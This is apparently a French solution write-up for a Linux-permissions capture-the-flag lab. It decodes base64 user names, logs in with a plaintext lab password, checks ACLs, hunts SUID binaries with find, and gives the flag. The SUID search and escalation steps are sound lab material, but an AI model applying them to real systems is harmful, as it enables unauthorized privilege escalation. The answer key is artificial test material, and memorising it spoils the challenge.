# 🔐 Solution du CTF Linux Permissions Master

## Étape 1: Décryptage des identifiants
```bash
# Décryptage base64
echo "cm9vdG1lX3VzZXIx" | base64 -d    # rootme_user1
echo "cm9vdG1lX3VzZXIy" | base64 -d    # rootme_user2
echo "YWRtaW5fdXNlcg==" | base64 -d    # admin_user
echo "c2VjdXJpdHlfZ3Jw" | base64 -d    # security_grp
echo "ZmxhZ190ZXN0LnR4dA==" | base64 -d # flag_test.txt
```

## Étape 2: Exploration initiale
```bash

# Connexion avec rootme_user1
su - rootme_user1
password: PASSWORD123

# Exploration de /ctf
ls -la /ctf
```

## Étape 3: Analyse des permissions
```bash

# Vérification des ACL
getfacl /ctf/restricted
# rootme_user1 a accès en lecture seule

# Lecture de l'indice
cat /ctf/restricted/hint.txt
```

## Étape 4: Exploitation du SUID
```bash

# Recherche des binaires SUID
find /ctf -perm -4000 2>/dev/null
# /ctf/binaries/create_flag

# Exécution du binaire
/ctf/binaries/create_flag
```

## Étape 5: Récupération du flag
```bash

# Le binaire a créé le vrai flag
ls -la /ctf/private/real_flag.txt
# Mais seul admin_user peut le lire!

# Solution: utiliser le binaire SUID qui s'exécute comme admin_user
# Le flag est: RM{suid_bit_escalation_1337}
```
